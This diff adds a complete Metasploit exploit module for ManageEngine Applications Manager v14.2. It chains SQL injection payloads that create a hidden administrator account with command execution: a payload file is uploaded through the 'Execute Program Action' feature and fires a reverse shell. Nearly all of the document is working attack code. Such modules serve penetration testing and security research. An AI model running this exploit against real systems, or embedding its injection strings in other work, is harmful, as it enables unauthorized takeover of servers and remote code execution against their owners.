@@ -1,0 +1,335 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+ 
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+ 
+  include Msf::Exploit::Remote::HttpClient
+ 
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "ManageEngine Application Manager v14.2 - Privilege Escalation / Remote Command Execution",
+      'Description'    => %q(
+        This module exploits sqli and command injection vulnerability in the ME Application Manager v14.2 and prior versions.
+ 
+        Module creates a new admin user with SQLi (MSSQL/PostgreSQL) and provides privilege escalation.
+        Therefore low authority user can gain the authority of "system" on the server. 
+        It uploads malicious file using the "Execute Program Action(s)" feature of Application Manager.
+
+        /////// This 0day has been published at DEFCON-AppSec Village. ///////
+
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'AkkuS <Özkan Mustafa Akkuş>', # Discovery & PoC & Metasploit module @ehakkus
+        ],
+      'References'     =>
+        [
+          [ 'URL', 'http://pentest.com.tr/exploits/DEFCON-ManageEngine-APM-v14-Privilege-Escalation-Remote-Command-Execution.html' ]
+        ],
+      'DefaultOptions' =>
+        {
+          'WfsDelay' => 60,
+          'RPORT' => 9090,
+          'SSL' => false,
+          'PAYLOAD' => 'generic/shell_reverse_tcp'
+        },
+      'Privileged'     => true,
+      'Payload'        =>
+        {
+          'DisableNops' => true,
+        },
+      'Platform'       => ['unix', 'win'],
+      'Targets' =>
+        [
+          [ 'Windows Target',
+            {
+              'Platform' => ['win'],
+              'Arch' => ARCH_CMD,
+            }
+          ],
+          [ 'Linux Target',
+            {
+              'Platform' => ['unix'],
+              'Arch' => ARCH_CMD,
+              'Payload' =>
+                {
+                  'Compat' =>
+                    {
+                      'PayloadType' => 'cmd',
+                    }
+                }
+            }
+          ]
+        ],
+      'DisclosureDate' => '10 August 2019 //DEFCON',
+      'DefaultTarget'  => 0))
+
+    register_options(
+      [
+        OptString.new('USERNAME',  [true, 'OpManager Username']),
+        OptString.new('PASSWORD',  [true, 'OpManager Password']),
+        OptString.new('TARGETURI',  [true, 'Base path for ME application', '/'])
+      ],self.class)
+  end
+
+  def check_platform(cookie)
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'showTile.do'),
+      'cookie'  => cookie,
+      'vars_get' => {
+        'TileName' => '.ExecProg',
+        'haid' => 'null',
+      }
+    )
+    if res && res.code == 200 && res.body.include?('createExecProgAction')
+      @dir = res.body.split('name="execProgExecDir" maxlength="200" size="40" value="')[1].split('" class=')[0]
+      if @dir =~ /:/
+        platform = Msf::Module::Platform::Windows
+      else 
+        platform = Msf::Module::Platform::Unix
+      end
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred! DIR could not be detected.')
+    end
+    file_up(cookie, platform, @dir)
+  end
+
+  def file_up(cookie, platform, dir)
+    if platform == Msf::Module::Platform::Windows
+      filex = ".bat"
+    else
+      if payload.encoded =~ /sh/
+        filex = ".sh"
+      elsif payload.encoded =~ /perl/
+        filex = ".pl"
+      elsif payload.encoded =~ /awk 'BEGIN{/
+        filex = ".sh"
+      elsif payload.encoded =~ /python/
+        filex = ".py"
+      elsif payload.encoded =~ /ruby/
+        filex = ".rb"
+      else
+        fail_with(Failure::Unknown, 'Payload type could not be checked!')
+      end
+    end
+ 
+    @fname= rand_text_alpha(9 + rand(3)) + filex
+    data = Rex::MIME::Message.new
+    data.add_part('./', nil, nil, 'form-data; name="uploadDir"')
+    data.add_part(payload.encoded, 'application/octet-stream', nil, "form-data; name=\"theFile\"; filename=\"#{@fname}\"")
+ 
+    res = send_request_cgi({
+      'method' => 'POST',    
+      'data'  => data.to_s,
+      'agent' => 'Mozilla',
+      'ctype' => "multipart/form-data; boundary=#{data.bound}",
+      'cookie' => cookie,
+      'uri' => normalize_uri(target_uri, "Upload.do")     
+    })
+ 
+    if res && res.code == 200 && res.body.include?('icon_message_success')
+      print_good("#{@fname} malicious file has been uploaded.")
+      create_exec_prog(cookie, dir, @fname)
+    else
+      fail_with(Failure::Unknown, 'The file could not be uploaded!')
+    end
+  end
+
+  def create_exec_prog(cookie, dir, fname)
+ 
+    @display = rand_text_alphanumeric(7)
+    res = send_request_cgi(
+      'method'  => 'POST',
+      'uri'     =>  normalize_uri(target_uri.path, 'adminAction.do'),
+      'cookie'  => cookie,
+      'vars_post' => {
+        'actions' => '/showTile.do?TileName=.ExecProg&haid=null',
+        'method' => 'createExecProgAction',
+        'id' => 0,
+        'displayname' => @display,
+        'serversite' => 'local',
+        'choosehost' => -2,
+        'abortafter' => 5,
+        'command' => fname,
+        'execProgExecDir' => dir,
+        'cancel' => 'false'
+      }
+    )
+ 
+    if res && res.code == 200 && res.body.include?('icon_message_success')
+      actionid = res.body.split('actionid=')[1].split("','710','350','250','200')")[0] 
+      print_status("Transactions completed. Attempting to get a session...")
+      exec(cookie, actionid)
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred!')
+    end
+  end
+
+  def exec(cookie, action)
+    send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'common', 'executeScript.do'),
+      'cookie'  => cookie,
+      'vars_get' => {
+        'method' => 'testAction',
+        'actionID' => action,
+        'haid' => 'null'
+      }
+    )
+  end
+ 
+  def peer
+    "#{ssl ? 'https://' : 'http://' }#{rhost}:#{rport}"
+  end
+ 
+  def print_status(msg='')
+    super("#{peer} - #{msg}")
+  end
+ 
+  def print_error(msg='')
+    super("#{peer} - #{msg}")
+  end
+ 
+  def print_good(msg='')
+    super("#{peer} - #{msg}")
+  end 
+
+  def check
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'index.do'),
+    )
+    # For this part the build control will be placed.
+    if res && res.code == 200 && res.body.include?('Build No:142')
+      return Exploit::CheckCode::Vulnerable
+    else 
+      return Exploit::CheckCode::Safe
+    end
+  end
+
+  def app_login
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+    )
+
+    if res && res.code == 200 && res.body.include?('.loginDiv')
+      @cookie = res.get_cookies
+
+      res = send_request_cgi(
+        'method'  => 'POST',
+        'cookie'   => @cookie,
+        'uri'     =>  normalize_uri(target_uri.path, '/j_security_check'),
+        'vars_post' => {
+          'clienttype' => 'html',
+          'j_username' => datastore['USERNAME'],
+          'j_password' => datastore['PASSWORD'],
+          'submit' => 'Login'
+        }
+      )
+
+      if res && res.code == 303
+        res = send_request_cgi(
+          'cookie'  => @cookie,
+          'method'  => 'GET',
+          'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+        )
+
+        @cookie = res.get_cookies
+        send_sqli(@cookie)
+      else
+        fail_with(Failure::NotVulnerable, 'Failed to perform privilege escalation!')
+      end     
+
+    else
+      fail_with(Failure::Unreachable, 'Connection error occurred! User information is incorrect.')
+    end
+  end
+
+  def exploit
+    unless Exploit::CheckCode::Vulnerable == check
+      fail_with(Failure::NotVulnerable, 'Target is not vulnerable.')
+    end
+    app_login
+  end
+
+  def send_sqli(cookies)
+
+    @uname = Rex::Text.rand_text_alpha_lower(6)
+    uid = rand_text_numeric(3)
+    apk = rand_text_numeric(6) 
+    @pwd = rand_text_alphanumeric(8+rand(9))
+    @uidCHR = "#{uid.unpack('c*').map{|c| "CHAR(#{c})" }.join('+')}"
+    @unameCHR = "#{@uname.unpack('c*').map{|c| "CHAR(#{c})" }.join('+')}"
+    @apkCHR = "#{apk.unpack('c*').map{|c| "CHAR(#{c})" }.join('+')}"
+    @adm = "CHAR(65)+CHAR(68)+CHAR(77)+CHAR(73)+CHAR(78)"
+    pg_user ="" 
+    pg_user << "1;insert+into+AM_UserPasswordTable+(userid,username,password)+values+"
+    pg_user << "($$#{uid}$$,$$#{@uname}$$,$$#{Rex::Text.md5(@pwd)}$$);"
+    pg_user << "insert+into+Am_UserGroupTable+(username,groupname)+values+($$#{@uname}$$,$$ADMIN$$);--+"
+    ms_user =""
+    ms_user << "1 INSERT INTO AM_UserPasswordTable(userid,username,password,apikey) values (#{@uidCHR},"
+    ms_user << " #{@unameCHR}, 0x#{Rex::Text.md5(@pwd)}, #{@apkCHR});"
+    ms_user << "INSERT INTO AM_UserGroupTable(username,groupname) values (#{@unameCHR}, #{@adm})--"
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, '/jsp/NewThresholdConfiguration.jsp?resourceid=' + pg_user + '&attributeIDs=17,18&attributeToSelect=18'),
+      'cookie'   => cookies
+    )
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, '/jsp/NewThresholdConfiguration.jsp?resourceid=' + ms_user + '&attributeIDs=17,18&attributeToSelect=18'),
+      'cookie'   => cookies
+    )
+
+    res = send_request_cgi(
+      'method'  => 'GET',
+      'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+    )
+
+    if res && res.code == 200 && res.body.include?('.loginDiv')
+      @cookie = res.get_cookies
+
+      res = send_request_cgi(
+        'method'  => 'POST',
+        'cookie'   => @cookie,
+        'uri'     =>  normalize_uri(target_uri.path, '/j_security_check'),
+        'vars_post' => {
+          'clienttype' => 'html',
+          'j_username' => @uname,
+          'j_password' => @pwd,
+          'submit' => 'Login'
+        }
+      )
+      print @uname + "//" + @pwd
+      puts res.body
+      if res && res.code == 303
+        print_good("Privilege Escalation was successfully performed.")
+        print_good("New APM admin username = " + @uname)
+        print_good("New APM admin password = " + @pwd)
+        res = send_request_cgi(
+          'cookie'  => @cookie,
+          'method'  => 'GET',
+          'uri'     =>  normalize_uri(target_uri.path, 'applications.do'),
+        )
+
+        @cookie = res.get_cookies
+        check_platform(@cookie)
+      else
+        fail_with(Failure::NotVulnerable, 'Failed to perform privilege escalation!')
+      end
+    else
+      fail_with(Failure::NotVulnerable, 'Something went wrong!')
+    end
+  end
+end
